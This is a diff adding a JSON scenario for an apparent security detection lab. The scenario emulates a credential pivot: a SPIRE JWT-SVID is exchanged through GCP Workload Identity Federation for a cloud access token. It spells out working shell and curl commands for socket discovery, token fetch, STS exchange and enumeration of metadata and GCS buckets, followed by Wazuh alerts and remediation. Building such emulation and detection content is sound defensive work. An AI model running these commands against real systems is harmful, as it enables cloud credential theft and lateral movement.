@@ -1,0 +1,245 @@
+{
+  "id": "S7-13",
+  "name": "Workload Identity Federation Cross-Cloud Pivot",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Exchange a SPIRE JWT-SVID for cloud provider credentials via Workload Identity Federation (WIF), pivoting from a SPIFFE identity to cloud IAM access. The attacker obtains a JWT-SVID from the SPIRE Workload API and uses it as a subject_token in a GCP Security Token Service (STS) exchange, receiving a GCP access token that grants access to cloud resources.",
+  "difficulty": "Expert",
+  "real_world_relevance": "GCP Workload Identity Federation allows external identity providers (including SPIRE) to exchange tokens for GCP credentials without static service account keys. This is a legitimate pattern, but if an attacker obtains a JWT-SVID (via selector spoofing, container escape, or workload API socket access), they can pivot from the SPIFFE identity plane into cloud IAM. The 2024 AWS IMDSv1 attacks and GCP metadata server exploits demonstrate similar token exchange pivots in cloud environments.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Lateral Movement", "Defense Evasion"],
+    "techniques": [
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"},
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-agent", "k8s-node-1", "gcp-metadata"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker obtains a SPIRE JWT-SVID and exchanges it for GCP cloud credentials via Workload Identity Federation STS endpoint",
+    "diagram": [
+      "1. Attacker gains access to SPIRE Workload API socket (e.g., via container escape or pod compromise)",
+      "2. Fetches a JWT-SVID from the SPIRE agent with audience set to the GCP WIF provider",
+      "3. Sends the JWT-SVID to GCP STS token exchange endpoint as subject_token",
+      "4. GCP WIF validates the SVID against the configured SPIRE trust bundle",
+      "5. GCP returns a federated access token mapped to a GCP service account",
+      "6. Attacker uses the GCP access token to access cloud resources (GCS, Compute, IAM)",
+      "7. Cloud audit logs show access from the mapped service account, not the original SPIFFE identity"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Workload API Socket Discovery",
+      "description": "Locate the SPIRE Workload API socket and verify access to fetch SVIDs",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "ls -la /opt/spire/sockets/workload_api.sock",
+          "description": "Verify workload API socket is accessible"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | head -5",
+          "description": "Verify SVID fetch capability — confirms workload API access"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "cat /proc/self/mountinfo | grep spire || find / -name 'workload_api.sock' -type s 2>/dev/null",
+          "description": "Alternative socket discovery via mount info or filesystem search"
+        }
+      ]
+    },
+    {
+      "name": "JWT-SVID Acquisition",
+      "description": "Fetch a JWT-SVID from the SPIRE agent with the audience set to the GCP Workload Identity Federation provider",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch jwt -audience gcp-wif -socketPath /opt/spire/sockets/workload_api.sock",
+          "description": "Fetch JWT-SVID with GCP WIF audience claim"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "JWT=$(/opt/spire/bin/spire-agent api fetch jwt -audience gcp-wif -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | grep -oP 'token\\(.*?\\):\\K.*') && echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
+          "description": "Extract and decode JWT payload to verify SPIFFE ID, audience, and expiration claims"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch jwt -audience //iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/spire-pool/providers/spire-provider -socketPath /opt/spire/sockets/workload_api.sock",
+          "description": "Fetch JWT-SVID with full GCP WIF provider audience URI for realistic exchange"
+        }
+      ]
+    },
+    {
+      "name": "GCP STS Token Exchange",
+      "description": "Exchange the JWT-SVID for a GCP federated access token via the Security Token Service",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "JWT=$(/opt/spire/bin/spire-agent api fetch jwt -audience gcp-wif -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | grep -oP 'token\\(.*?\\):\\K.*') && curl -s -X POST http://gcp-metadata:1339/v1/token -H 'Content-Type: application/x-www-form-urlencoded' -d \"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=//iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/spire-pool/providers/spire-provider\"",
+          "description": "Exchange JWT-SVID for GCP STS federated token"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "GCP_TOKEN=$(curl -s -X POST http://gcp-metadata:1339/v1/token -H 'Content-Type: application/x-www-form-urlencoded' -d \"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=//iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/spire-pool/providers/spire-provider\" | python3 -c 'import sys,json; print(json.load(sys.stdin)[\"access_token\"])') && echo \"GCP Token acquired: ${GCP_TOKEN:0:20}...\"",
+          "description": "Extract GCP access token from STS response"
+        }
+      ]
+    },
+    {
+      "name": "Cloud Resource Access",
+      "description": "Use the acquired GCP access token to access cloud resources — demonstrating the cross-cloud pivot",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -s -H \"Authorization: Bearer $GCP_TOKEN\" http://gcp-metadata:1339/computeMetadata/v1/project/ -H 'Metadata-Flavor: Google'",
+          "description": "Access GCP project metadata using the exchanged token"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -s -H \"Authorization: Bearer $GCP_TOKEN\" http://gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/default/email -H 'Metadata-Flavor: Google'",
+          "description": "Retrieve the service account email mapped to the SPIFFE identity"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -s -H \"Authorization: Bearer $GCP_TOKEN\" http://gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor: Google'",
+          "description": "Enumerate OAuth scopes granted to the exchanged token — reveals cloud access permissions"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -s -H \"Authorization: Bearer $GCP_TOKEN\" 'https://storage.googleapis.com/storage/v1/b?project=victim-project-123' 2>/dev/null || echo 'GCS access attempted (mock environment)'",
+          "description": "Attempt to list GCS buckets — demonstrates cloud resource access via SPIFFE pivot"
+        }
+      ]
+    },
+    {
+      "name": "Detection Confirmation",
+      "description": "Run monitoring to detect the JWT-SVID fetch and WIF token exchange",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect JWT-SVID fetch with cloud audience"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Agent Audit",
+      "description": "JWT-SVID fetched with cloud provider audience (gcp-wif, iam.googleapis.com)",
+      "wazuh_rule": "101060"
+    },
+    {
+      "type": "Network",
+      "description": "STS token exchange request to GCP WIF endpoint using JWT-SVID as subject_token",
+      "wazuh_rule": "101095"
+    },
+    {
+      "type": "Cloud Metadata",
+      "description": "Cloud metadata access using token obtained via SPIFFE-to-cloud token exchange",
+      "wazuh_rule": "100651"
+    },
+    {
+      "type": "SPIRE Identity Monitor",
+      "description": "JWT-SVID fetch with non-standard audience indicating cross-cloud pivot attempt",
+      "wazuh_rule": "101060"
+    },
+    {
+      "type": "GCP Audit Log",
+      "description": "Cloud API calls from workload identity federation principal — source identity is SPIFFE",
+      "wazuh_rule": "101095"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101060",
+      "level": 12,
+      "description": "NHI: JWT-SVID fetched with cloud provider audience"
+    },
+    {
+      "rule_id": "101095",
+      "level": 14,
+      "description": "NHI: Workload Identity Federation token exchange — SPIFFE to cloud pivot"
+    },
+    {
+      "rule_id": "100651",
+      "level": 10,
+      "description": "NHI: Cloud metadata access with exchanged credentials"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke the GCP access token obtained via the WIF exchange",
+      "Rotate the SPIRE agent attestation credentials on the affected node",
+      "Review GCP Cloud Audit Logs for all actions taken with the federated token",
+      "Remove the compromised workload's registration entry from SPIRE",
+      "Restrict access to the SPIRE Workload API socket on the affected pod/node"
+    ],
+    "long_term": [
+      "Implement audience restrictions on SPIRE registration entries to limit which audiences can be requested",
+      "Configure GCP WIF with attribute conditions that restrict which SPIFFE IDs can exchange tokens",
+      "Use GCP WIF attribute mapping to enforce principal/principalSet constraints",
+      "Monitor JWT-SVID fetch patterns and alert on unusual audience values",
+      "Implement short-lived JWT-SVID TTLs (5 minutes or less) to limit token exchange windows",
+      "Deploy SPIRE Workload API socket access controls using Kubernetes PodSecurityPolicies or OPA",
+      "Enable GCP VPC Service Controls to limit what the federated token can access",
+      "Forward GCP Cloud Audit Logs to SIEM and correlate with SPIRE audit events for full attack chain visibility"
+    ]
+  },
+
+  "demo_script": {
+    "container": "k8s-node-1",
+    "commands": [
+      "scripts/talk/demo-spiffe-wif-crosscloud.sh"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GCP Workload Identity Federation Documentation",
+      "url": "https://cloud.google.com/iam/docs/workload-identity-federation"
+    },
+    {
+      "title": "SPIFFE JWT-SVID Specification",
+      "url": "https://github.com/spiffe/spiffe/blob/main/standards/JWT-SVID.md"
+    },
+    {
+      "title": "GCP Security Token Service (STS) API",
+      "url": "https://cloud.google.com/iam/docs/reference/sts/rest/v1/TopLevel/token"
+    },
+    {
+      "title": "Configuring SPIRE for GCP Workload Identity Federation",
+      "url": "https://spiffe.io/docs/latest/keyless/gcp/"
+    },
+    {
+      "title": "MITRE ATT&CK T1550.001 — Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    }
+  ]
+}
